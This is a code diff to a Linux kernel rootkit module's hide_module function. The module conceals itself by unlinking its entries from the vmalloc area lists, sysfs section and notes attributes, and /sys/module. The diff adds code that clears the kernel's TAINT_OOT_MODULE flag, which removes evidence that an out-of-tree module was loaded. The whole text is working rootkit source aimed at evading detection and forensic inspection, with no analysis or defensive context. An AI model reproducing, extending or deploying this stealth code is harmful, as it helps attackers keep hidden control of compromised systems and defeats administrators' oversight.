@@ -3,12 +3,14 @@
 #include "constants.h"
 #include "hooking.h"
 #include "macro_utils.h"
+#include <asm-generic/bitops/instrumented-atomic.h>
 #include <asm/current.h>
 #include <linux/cred.h>
 #include <linux/errno.h>
 #include <linux/kobject.h>
 #include <linux/list.h>
 #include <linux/module.h>
+#include <linux/panic.h>
 #include <linux/pid.h>
 #include <linux/printk.h>
 #include <linux/rbtree.h>
@@ -22,10 +24,14 @@
 LIST_HEAD(hidden_pids_list);
 LIST_HEAD(authorized_pids_list);
 
+static bool b_hidden = false; // Is the rootkit hidden?
+
 static task_t *(*_find_get_task_by_vpid)(pid_t nr) = NULL; // Pointer to `find_get_task_by_vpid()`
 
 static struct list_head *p_vma_list = NULL; // Pointer to `vmap_area_list`
 static struct rb_root *p_vma_root   = NULL; // Pointer to `vmap_area_root`
+
+static unsigned long *p_tainted_mask = NULL;
 
 void hide_module(void)
 {
@@ -37,24 +43,54 @@ void hide_module(void)
     struct module_notes_attrs *notes_attrs = NULL;
     struct module_sect_attrs *sect_attrs   = NULL;
 
-    if (p_vma_list == NULL) {
+    pr_info("[ROOTKIT] Hiding module...\n");
+
+    IF_U (b_hidden) {
+        pr_warn("[ROOTKIT] * Rootkit is already hidden\n");
+        return;
+    }
+
+    IF_L (p_tainted_mask == NULL) {
+        p_tainted_mask = (unsigned long *)lookup_name("tainted_mask");
+
+        IF_U (p_tainted_mask == NULL) {
+            pr_err("[ROOTKIT] * Failed to get `tainted_mask` address\n");
+        }
+        else {
+            pr_info("[ROOTKIT] * Original tainted_mask: *%p = %lu\n", p_tainted_mask,
+                    *p_tainted_mask);
+
+            clear_bit(TAINT_OOT_MODULE, p_tainted_mask);
+
+            pr_info("[ROOTKIT]   * Cleared TAINT_OOT_MODULE status\n");
+            pr_info("[ROOTKIT]   * Edited tainted_mask: *%p = %lu\n", p_tainted_mask,
+                    *p_tainted_mask);
+        }
+    }
+
+    IF_L (p_vma_list == NULL) {
         p_vma_list = (struct list_head *)lookup_name("vmap_area_list");
     }
-    if (p_vma_root == NULL) {
+    pr_info("[ROOTKIT] * p_vma_list: %p\n", p_vma_list);
+
+    IF_L (p_vma_root == NULL) {
         p_vma_root = (struct rb_root *)lookup_name("vmap_area_root");
     }
+    pr_info("[ROOTKIT] * p_vma_root: %p\n", p_vma_root);
 
-    pr_info("[ROOTKIT] p_vma_list: %p\n", p_vma_list);
-    pr_info("[ROOTKIT] p_vma_root: %p\n", p_vma_root);
-
-    // Remove module from /proc/vmallocinfo
-    list_for_each_entry_safe (p_vma, p_vma_tmp, p_vma_list, list) {
-        if ((unsigned long)THIS_MODULE > p_vma->va_start &&
-            (unsigned long)THIS_MODULE < p_vma->va_end) {
-            pr_info("[ROOTKIT] * Removing VMAP area %p...", p_vma);
-            list_del(&p_vma->list);
-            rb_erase(&p_vma->rb_node, p_vma_root);
-            pr_cont(" done\n");
+    IF_U (p_vma_list == NULL || p_vma_root == NULL) {
+        pr_err("[ROOTKIT] * Failed to get `vmap_area_list` or `vmap_area_root` address\n");
+    }
+    else {
+        // Remove module from /proc/vmallocinfo
+        list_for_each_entry_safe (p_vma, p_vma_tmp, p_vma_list, list) {
+            if ((unsigned long)THIS_MODULE > p_vma->va_start &&
+                (unsigned long)THIS_MODULE < p_vma->va_end) {
+                pr_info("[ROOTKIT] * Removing VMAP area %p...", p_vma);
+                list_del(&p_vma->list);
+                rb_erase(&p_vma->rb_node, p_vma_root);
+                pr_cont(" done\n");
+            }
         }
     }
 
@@ -71,7 +107,7 @@ void hide_module(void)
 
     // Clear notes_attr (see kernel/module.c)
     notes_attrs = THIS_MODULE->notes_attrs;
-    if (notes_attrs != NULL) {
+    IF_L (notes_attrs != NULL) {
         pr_info("[ROOTKIT] * Removing notes_attr %p...", notes_attrs);
         if (notes_attrs->dir != NULL) {
             i = THIS_MODULE->notes_attrs->notes;
@@ -87,7 +123,7 @@ void hide_module(void)
 
     // Clear sect_attrs (see kernel/module.c)
     sect_attrs = THIS_MODULE->sect_attrs;
-    if (sect_attrs != NULL) {
+    IF_L (sect_attrs != NULL) {
         pr_info("[ROOTKIT] * Removing sect_attr %p...", sect_attrs);
         sysfs_remove_group(&THIS_MODULE->mkobj.kobj, &sect_attrs->grp);
         for (i = 0; i < sect_attrs->nsections; i++) {
@@ -111,6 +147,8 @@ void hide_module(void)
     // Remove module from /sys/module/
     kobject_del(&THIS_MODULE->mkobj.kobj);
     list_del(&THIS_MODULE->mkobj.kobj.entry);
+
+    b_hidden = true;
 
     pr_info("[ROOTKIT] Module was hidden\n");
 }
